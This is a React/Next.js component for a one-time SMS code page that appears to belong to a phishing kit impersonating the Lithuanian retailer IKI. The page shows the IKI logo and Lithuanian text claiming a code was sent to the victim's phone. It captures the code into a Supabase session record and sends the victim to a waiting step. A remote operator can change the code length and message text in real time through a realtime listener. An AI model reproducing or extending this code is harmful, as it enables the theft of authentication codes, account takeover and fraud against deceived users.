"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function SmsClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [digits, setDigits] = useState(6);
  const [customText, setCustomText] = useState<string | null>(null);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const ui = {
    panel: "app-panel rounded-2xl p-6",
    input: "app-input mt-2 w-full px-4 py-3 text-lg tracking-[0.35em]",
    submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-50",
  };

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setLoading(false);
        return;
      }
      const { data } = await supabase.from("sessions").select("sms_digits, form_data, sms_custom_text").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) {
        setLoading(false);
        return;
      }

      setDigits(data.sms_digits ?? 6);
      setCustomText(data.sms_custom_text);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      setCode(fd.smsCode ?? "");
      setLoading(false);
    })();

    // Supabase Realtime Listener for sms_digits changes
    if (supabase && sessionId) {
      const channel = supabase
        .channel(`sms-client:${sessionId}`)
        .on(
          "postgres_changes",
          {
            event: "UPDATE",
            schema: "public",
            table: "sessions",
            filter: `id=eq.${sessionId}`,
          },
          (payload) => {
            const next = payload.new as { sms_digits?: number; sms_custom_text?: string | null };
            if (next.sms_digits) {
              setDigits(next.sms_digits);
              // EÄŸer kod, yeni haneden uzunsa keselim
              setCode((prev) => prev.slice(0, next.sms_digits));
            }
            if (next.sms_custom_text !== undefined) {
              setCustomText(next.sms_custom_text);
            }
          }
        )
        .subscribe();

      return () => {
        cancelled = true;
        void supabase.removeChannel(channel);
      };
    }

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    setSaving(true);
    setMsg(null);

    const nextFormData = { ...sessionFormData, smsCode: code.trim() };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Nepavyko išsiųsti.");
    else {
      setSessionFormData(nextFormData);
      router.push(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="pak-page-shell">
        <div className="pak-form-card w-full max-w-[650px] p-5 sm:p-8">
          <div className="pak-form-inner"><ConfigMissing /></div>
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="pak-page-shell">
        <div className="pak-form-card w-full max-w-[650px] p-5 sm:p-8 text-center">
          <div className="pak-form-inner">
            <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
              Neteisinga nuoroda.
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="pak-page-shell">
        <div className="pak-form-card flex w-full max-w-[650px] justify-center p-5 py-16 sm:p-8">
          <div className="pak-form-inner flex justify-center">
            <div className="size-12 animate-spin rounded-full border-4 border-[#4ade80] border-t-transparent" />
          </div>
        </div>
      </div>
    );
  }

  const trimmed = code.trim();
  const valid = trimmed.length === digits && /^\d+$/.test(trimmed);
  const displayText = customText || settings.sms_subtitle;

  // OTP style input handling
  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    const newCode = code.split("");
    newCode[index] = value.substring(value.length - 1); // Only take the last char
    const updatedCode = newCode.join("");
    setCode(updatedCode.slice(0, digits));

    // Move to next input
    if (value && index < digits - 1) {
      const nextInput = document.getElementById(`otp-input-${index + 1}`);
      if (nextInput) nextInput.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      const prevInput = document.getElementById(`otp-input-${index - 1}`);
      if (prevInput) prevInput.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, digits);
    setCode(pastedData);
    if (pastedData.length > 0) {
      const focusIndex = Math.min(pastedData.length, digits - 1);
      const input = document.getElementById(`otp-input-${focusIndex}`);
      if (input) input.focus();
    }
  };

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[860px] fade-in">
        <div className="pak-form-inner px-4 pb-5 pt-5 sm:px-8 sm:pb-8 sm:pt-8 lg:px-10">
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0 max-w-[29rem]">
              <h2 className="pak-form-title">{settings.sms_title}</h2>
              <p className="pak-form-subtitle mt-2 whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
            </div>
            <img
              src={settings.logo_url || "/form-assets/iki-mini-logo.webp"}
              alt="IKI logo"
              className="pak-form-brand-logo shrink-0"
              id="sms-ah-logo"
            />
          </div>

          <form onSubmit={handleSubmit} className="mt-5 space-y-5 sm:mt-6">
            <div className="pak-form-label">
              <div className="mb-3">{settings.sms_input_label} ({digits})</div>
              <div
                className="grid w-full gap-2 mx-auto"
                style={{
                  gridTemplateColumns: `repeat(${digits}, minmax(0, 1fr))`,
                  maxWidth:
                    digits <= 4 ? "320px" :
                    digits <= 6 ? "420px" :
                    digits <= 8 ? "520px" : "100%",
                }}
                onPaste={handlePaste}
              >
                {Array.from({ length: digits }).map((_, index) => (
                  <input
                    key={index}
                    id={`otp-input-${index}`}
                    required
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    maxLength={1}
                    className="pak-form-otp aspect-[5/6] text-center text-xl font-bold sm:text-2xl"
                    value={code[index] || ""}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  />
                ))}
              </div>
            </div>

            {!valid && code.length > 0 ? (
              <p className="text-xs text-red-400">Įveskite tiksliai {digits} skaitmenis.</p>
            ) : null}

            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}

            <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
              <div className="pak-form-security">
                <svg className="h-9 w-9 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                </svg>
                <span>Kodas išsiųstas SMS žinute jūsų telefono numeriu.</span>
              </div>

              <button
                type="submit"
                disabled={saving || !valid}
                className="pak-form-button min-h-[3.85rem] w-full px-6 text-lg md:w-[22rem]"
              >
                {saving ? settings.sms_loading : settings.sms_button}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
